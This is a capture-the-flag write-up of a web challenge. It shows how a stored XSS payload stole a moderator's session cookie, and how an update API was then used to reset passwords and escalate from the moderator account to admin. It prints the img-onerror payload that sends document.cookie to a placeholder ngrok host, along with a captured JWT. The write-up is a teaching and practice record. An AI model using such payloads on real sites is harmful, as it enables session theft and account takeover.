## Krpytos Support
> Solved By : thewhiteh4t

In this one we land on a support page where we can send a POST request, it also contains a backend button which takes us to a login page…

first I thought its a cookie stealing challenge so I send the following payload : 

```html
<img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>
```

and I got a JWT : 

```
session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im1vZGVyYXRvciIsInVpZCI6MTAwLCJpYXQiOjE2NTI1MzQ4ODV9.JO12yEA44QxXgfUmL3n6Sm4Et2AJc5rkvXkvSMdmFOI
```

decoded :

```
{
  "username": "moderator",
  "uid": 100,
  "iat": 1652534885
}
```

and I got two interesting things here, now the cookie did not work for login for some reason so I went back to enum and found an API endpoint :

```
/api/users/update
```

using XHR I sent the following request to change the password :

![](https://i.imgur.com/mVy9Zs9.png)

logged in with the new password :

![](https://i.imgur.com/lkqwQPZ.png)

but moderator doesn’t have the flag so I had to escalate to admin…

using the same payload above I just changed the `uid` from 100 to 1 and logged in again, I could have got it one go but well… 

![](https://i.imgur.com/JI1lO3O.png)